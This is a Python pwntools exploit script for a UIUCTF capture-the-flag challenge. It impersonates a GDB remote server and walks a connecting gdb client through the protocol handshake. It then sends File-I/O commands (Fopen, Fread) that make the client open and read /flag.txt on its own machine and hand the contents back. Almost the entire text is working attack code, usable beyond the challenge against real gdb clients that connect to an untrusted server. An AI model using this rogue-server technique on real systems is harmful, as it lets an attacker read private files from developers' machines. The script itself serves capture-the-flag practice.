from pwn import *
import binascii

###Util
def checksum(payload):
    chk = 0
    for i in payload:
        chk+=i
    chk&=0xff
    return hex(chk)[2:].rjust(2,'0').encode()

def recv():
    res = r.recvuntil('#')+r.recv(2)
    print(f'Command  : {res[2:-3].decode()}')

def send(response):
    print(f'Response : {response.decode()}')
    r.send(b'+$'+response+b'#'+checksum(response))


###Exploit
r = remote('chal.uiuc.tf',2002)

#  Handshake and check supported feature :: report no features
recv()  #qSupported:multiprocess+;xmlRegisters=i386;qRelocInsn
send(b'')

#  Set thread 0 for generic operations :: OK
recv()  #Hg0
send(b'OK')

#  ask stub for running trace experiment :: ignore and pretend remote server halted
recv()  #qTStatus
send(b'')

#  ask for reason halted ::
#  Document specifies the reply for ? is same as s/c, thus we can perform File-I/O commands now > open(len(filename),O_RDONLY,S_IRUSR)
recv()  #?
send(b'Fopen,0/0a,0,0')

#  continue on thread -1 :: OK
recv()  #Hc-1
send(b'OK')

#  return current thread id :: old thread
recv()  #qC
send(b'')

#  ask whether remote server attached to existing process or created new one :: attached to existing process
recv()  #qAttached
send(b'1')

#  Set thread 0 for generic operations :: OK
recv()  #Hg0
send(b'OK')

#  read 10 bytes to address 0 :: send filename
recv()  #m0,a
send(binascii.hexlify(b'/flag.txt\x00'))

#  open returned 3 :: send further File-I/O commands > read(3,(void*)0,0x1000)
recv()  #F3
send(b'Fread,3,0,1000')

#  write 0 bytes to address 0 :: OK
recv()  #X0,0:
send(b'OK')

#  write 23 bytes to address 0 :: OK
recv()  #X0,23:uiuctf{target remote google.com:80}]
send(b'OK')

#  read returned 23 :: process exited
recv()  #F23
send(b'W 00')
